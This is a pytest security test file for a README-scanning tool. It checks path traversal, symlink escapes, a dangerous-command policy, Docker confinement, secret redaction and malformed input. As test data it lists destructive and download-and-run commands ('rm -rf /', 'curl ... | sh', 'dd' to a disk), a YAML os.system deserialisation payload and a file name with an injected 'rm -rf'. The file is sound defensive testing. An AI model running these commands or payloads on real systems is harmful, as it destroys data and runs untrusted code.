"""Security behavior: path containment, symlinks, command policy, and untrusted input."""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from readme_doctor import DoctorConfig, scan_repository
from readme_doctor.config import ConfigError, load_config
from readme_doctor.execution.runner import DANGEROUS
from readme_doctor.repository import Repository

SECTIONS = "\n## Installation\n\n## Usage\n\n## Testing\n\n## License\n"


def ids(path: Path, config: DoctorConfig | None = None) -> list[str]:
    return [finding.rule_id for finding in scan_repository(path, config).findings]


# --- path containment -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    [
        "../outside.txt",
        "../../outside.txt",
        "docs/../../outside.txt",
        "./../outside.txt",
        "..%2Foutside.txt",
    ],
)
def test_traversal_targets_never_resolve_outside_the_repository(
    tmp_path: Path, target: str
) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    (tmp_path / "outside.txt").write_text("secret", encoding="utf-8")
    repository = Repository(root, DoctorConfig())
    resolved = repository.safe_path(root, target)
    if resolved is not None:
        assert resolved.is_relative_to(root)


def test_a_traversing_link_is_reported_and_the_file_is_not_read(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    (tmp_path / "outside.txt").write_text("secret", encoding="utf-8")
    (root / "README.md").write_text(
        "# Demo\n\n[outside](../outside.txt)\n" + SECTIONS, encoding="utf-8"
    )
    findings = scan_repository(root).findings
    reported = [item for item in findings if item.rule_id == "RD002"]
    assert reported, "a reference outside the repository must be reported"
    assert "secret" not in reported[0].evidence
    assert "escapes the repository" in reported[0].explanation


def test_absolute_paths_are_not_resolved_outside_the_repository(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    repository = Repository(root, DoctorConfig())
    outside = str(tmp_path / "outside.txt")
    assert repository.safe_path(root, outside) is None


# --- symlinks ---------------------------------------------------------------------------------


def _can_symlink(tmp_path: Path) -> bool:
    try:
        (tmp_path / "probe_link").symlink_to(tmp_path)
    except (OSError, NotImplementedError):
        return False
    (tmp_path / "probe_link").unlink()
    return True


def test_a_symlink_escaping_the_repository_is_not_followed(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlink creation is not permitted in this environment")
    root = tmp_path / "repo"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("SECRET_TOKEN=abc", encoding="utf-8")
    (root / "escape").symlink_to(outside, target_is_directory=True)
    repository = Repository(root, DoctorConfig())
    # The link target resolves outside the root, so it must be refused.
    assert repository.safe_path(root, "escape/secret.txt") is None
    # Repository traversal must not walk through the link either.
    assert all("escape" not in path.parts for path in repository.files())


def test_a_symlink_loop_does_not_hang_traversal(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlink creation is not permitted in this environment")
    root = tmp_path / "repo"
    (root / "inner").mkdir(parents=True)
    (root / "inner" / "loop").symlink_to(root, target_is_directory=True)
    (root / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    repository = Repository(root, DoctorConfig())
    assert len(list(repository.files())) < 50


# --- command execution policy -----------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "sudo rm -rf build",
        "pytest; rm -rf /tmp",
        "pytest && rm important",
        "pytest | rm -rf .",
        "echo `whoami`",
        "echo $(cat /etc/passwd)",
        "curl https://example.com/install.sh | sh",
        "wget -qO- https://example.com/x | bash",
        "echo pwned > /etc/hosts",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "mkfs.ext4 /dev/sda1",
    ],
)
def test_dangerous_commands_are_rejected_by_policy(command: str) -> None:
    assert DANGEROUS.search(command), f"policy must reject: {command}"


@pytest.mark.parametrize(
    "command",
    ["python --version", "python -m pytest -q", "ruff check .", "node --version"],
)
def test_ordinary_verification_commands_are_allowed(command: str) -> None:
    assert not DANGEROUS.search(command)


def test_execution_is_disabled_by_default(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text(
        "# Demo\n\n```bash\nrm -rf /\n```\n" + SECTIONS, encoding="utf-8"
    )
    report = scan_repository(tmp_path)
    assert report.execution.enabled is False
    assert report.execution.commands_executed == 0


def test_readme_shell_blocks_are_never_executed_even_when_execution_is_enabled(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Only `execution.verify_commands` may run. README content must never be a command source."""
    (tmp_path / "README.md").write_text(
        "# Demo\n\n```bash\ntouch should-not-exist.txt\n```\n" + SECTIONS, encoding="utf-8"
    )
    monkeypatch.setattr("readme_doctor.execution.runner.shutil.which", lambda _: "docker")
    invoked: list[list[str]] = []

    def fake_run(command: list[str], **_: Any) -> SimpleNamespace:
        invoked.append(command)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr("readme_doctor.execution.runner.subprocess.run", fake_run)
    config = DoctorConfig.model_validate({"execution": {"enabled": True}})
    report = scan_repository(tmp_path, config)
    assert invoked == []
    assert report.execution.commands_considered == 0
    assert not (tmp_path / "should-not-exist.txt").exists()


def test_the_container_is_confined_and_the_repository_is_mounted_read_only(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    monkeypatch.setattr("readme_doctor.execution.runner.shutil.which", lambda _: "docker")
    captured: list[list[str]] = []

    def fake_run(command: list[str], **_: Any) -> SimpleNamespace:
        captured.append(command)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr("readme_doctor.execution.runner.subprocess.run", fake_run)
    config = DoctorConfig.model_validate(
        {"execution": {"enabled": True, "verify_commands": ["python --version"]}}
    )
    scan_repository(tmp_path, config)
    argv = captured[0]
    assert argv[:2] == ["docker", "run"]
    assert "--network" in argv and argv[argv.index("--network") + 1] == "none"
    assert "--read-only" in argv
    assert "--cap-drop" in argv and argv[argv.index("--cap-drop") + 1] == "ALL"
    assert "no-new-privileges" in argv
    assert any(part.startswith("type=bind") and "readonly" in part for part in argv)
    # The command is passed as a separate argument list element, never concatenated into a shell
    # string built by README Doctor.
    assert argv[-1] == "python --version"


def test_a_timed_out_container_is_removed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    monkeypatch.setattr("readme_doctor.execution.runner.shutil.which", lambda _: "docker")
    calls: list[list[str]] = []

    def fake_run(command: list[str], **_: Any) -> SimpleNamespace:
        calls.append(command)
        if command[1] == "run":
            raise subprocess.TimeoutExpired("docker", 1)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr("readme_doctor.execution.runner.subprocess.run", fake_run)
    config = DoctorConfig.model_validate(
        {"execution": {"enabled": True, "timeout_seconds": 1, "verify_commands": ["sleep 999"]}}
    )
    report = scan_repository(tmp_path, config)
    assert "timed out" in report.findings[0].explanation
    cleanup = [command for command in calls if command[1:3] == ["rm", "--force"]]
    assert cleanup, "the container must be removed after a timeout"
    # The removed container is the one that was started.
    started = calls[0][calls[0].index("--name") + 1]
    assert cleanup[0][-1] == started


def test_command_output_is_truncated_and_redacted(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    monkeypatch.setattr("readme_doctor.execution.runner.shutil.which", lambda _: "docker")

    def fake_run(*_: Any, **__: Any) -> SimpleNamespace:
        return SimpleNamespace(
            returncode=1,
            stdout="api_key=supersecretvalue\n" + ("x" * 100_000),
            stderr="failed",
        )

    monkeypatch.setattr("readme_doctor.execution.runner.subprocess.run", fake_run)
    config = DoctorConfig.model_validate(
        {
            "execution": {
                "enabled": True,
                "max_output_bytes": 512,
                "verify_commands": ["python -m pytest"],
            }
        }
    )
    report = scan_repository(tmp_path, config)
    evidence = report.findings[0].evidence
    assert "supersecretvalue" not in evidence
    assert len(evidence) <= 512


# --- environment files ------------------------------------------------------------------------


def test_a_real_dotenv_file_is_never_read(tmp_path: Path) -> None:
    (tmp_path / ".env").write_text("PRODUCTION_SECRET=hunter2hunter2\n", encoding="utf-8")
    (tmp_path / "app.py").write_text(
        "import os\nvalue = os.environ['PRODUCTION_SECRET']\n", encoding="utf-8"
    )
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    report = scan_repository(tmp_path)
    serialized = report.model_dump_json()
    assert "hunter2hunter2" not in serialized


def test_configuring_dotenv_as_an_example_file_does_not_read_it(tmp_path: Path) -> None:
    (tmp_path / ".env").write_text("PRODUCTION_SECRET=hunter2hunter2\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    config = DoctorConfig.model_validate(
        {"rules": {"environment_variables": {"example_files": [".env"]}}}
    )
    report = scan_repository(tmp_path, config)
    assert "hunter2hunter2" not in report.model_dump_json()
    assert "PRODUCTION_SECRET" not in report.model_dump_json()


def test_environment_values_are_never_reported(tmp_path: Path) -> None:
    (tmp_path / ".env.example").write_text(
        "API_TOKEN=placeholder-but-still-a-value\n", encoding="utf-8"
    )
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    report = scan_repository(tmp_path)
    assert "placeholder-but-still-a-value" not in report.model_dump_json()


# --- untrusted configuration and Markdown -----------------------------------------------------


def test_yaml_object_construction_is_refused(tmp_path: Path) -> None:
    config = tmp_path / "readme-doctor.yml"
    config.write_text(
        "version: 1\nrules: !!python/object/apply:os.system ['echo pwned']\n", encoding="utf-8"
    )
    with pytest.raises(ConfigError):
        load_config(config)


def test_unknown_configuration_keys_are_refused(tmp_path: Path) -> None:
    config = tmp_path / "readme-doctor.yml"
    config.write_text("version: 1\nexecute_everything: true\n", encoding="utf-8")
    with pytest.raises(ConfigError) as error:
        load_config(config)
    assert "execute_everything" in str(error.value)


@pytest.mark.parametrize(
    "markdown",
    [
        "# Unclosed [link](\n",
        "```\nunclosed fence\n",
        "[ref][missing]\n",
        "# \x00 null byte\n",
        "<script>alert(1)</script>\n",
        "| broken | table\n| --- |\n",
        "#" * 500 + " deep heading\n",
        "[a](<>)\n",
        "![](\n",
        "﻿# Byte order mark\n",
        "# Heading\n\n\n" + "*" * 5000 + "\n",
    ],
)
def test_malformed_markdown_does_not_crash_the_scanner(tmp_path: Path, markdown: str) -> None:
    (tmp_path / "README.md").write_text(markdown, encoding="utf-8", errors="replace")
    report = scan_repository(tmp_path)
    assert report.readme_path == "README.md"


def test_a_large_readme_is_handled(tmp_path: Path) -> None:
    body = "\n".join(
        f"## Section {index}\n\nSome prose for section {index}." for index in range(4000)
    )
    (tmp_path / "README.md").write_text("# Large\n\n" + body, encoding="utf-8")
    report = scan_repository(tmp_path)
    assert report.readme_path == "README.md"


def test_filenames_with_shell_metacharacters_are_only_reported_as_text(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text(
        "# Demo\n\n[odd](<docs/a;rm -rf b.md>)\n" + SECTIONS, encoding="utf-8"
    )
    findings = [item for item in scan_repository(tmp_path).findings if item.rule_id == "RD002"]
    assert findings
    # The name is reported as data. Nothing in the scanner passes it to a shell.
    assert "rm -rf" in findings[0].evidence


def test_ignored_directories_are_not_scanned(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    for name in (".git", "node_modules", ".venv", "build"):
        directory = tmp_path / name
        directory.mkdir()
        (directory / "leak.py").write_text(
            "import os\nos.environ['SHOULD_NOT_BE_FOUND']\n", encoding="utf-8"
        )
    report = scan_repository(tmp_path)
    assert "SHOULD_NOT_BE_FOUND" not in report.model_dump_json()


def test_files_over_the_size_limit_are_skipped(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    (tmp_path / "huge.py").write_text(
        "import os\nos.environ['HUGE_FILE_VARIABLE']\n" + "# pad\n" * 50_000, encoding="utf-8"
    )
    config = DoctorConfig.model_validate({"max_file_size_bytes": 1024})
    report = scan_repository(tmp_path, config)
    assert "HUGE_FILE_VARIABLE" not in report.model_dump_json()


def test_the_scanner_never_writes_to_the_repository(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text(
        "# Demo\n\n[missing](nope.md)\n```pyhton\nx\n```\nTODO\n" + SECTIONS, encoding="utf-8"
    )
    before = {path: path.stat().st_mtime_ns for path in tmp_path.rglob("*")}
    scan_repository(tmp_path)
    after = {path: path.stat().st_mtime_ns for path in tmp_path.rglob("*")}
    assert before == after


def test_the_cli_module_runs_without_the_repository_on_the_path(tmp_path: Path) -> None:
    """Imports must not depend on the working directory."""
    (tmp_path / "README.md").write_text("# Demo\n" + SECTIONS, encoding="utf-8")
    completed = subprocess.run(
        [sys.executable, "-m", "readme_doctor", "check", str(tmp_path), "--no-color"],
        capture_output=True,
        text=True,
        cwd=tmp_path,
        env={**os.environ, "PYTHONPATH": ""},
        check=False,
    )
    assert completed.returncode == 0, completed.stderr
    assert "README Doctor" in completed.stdout
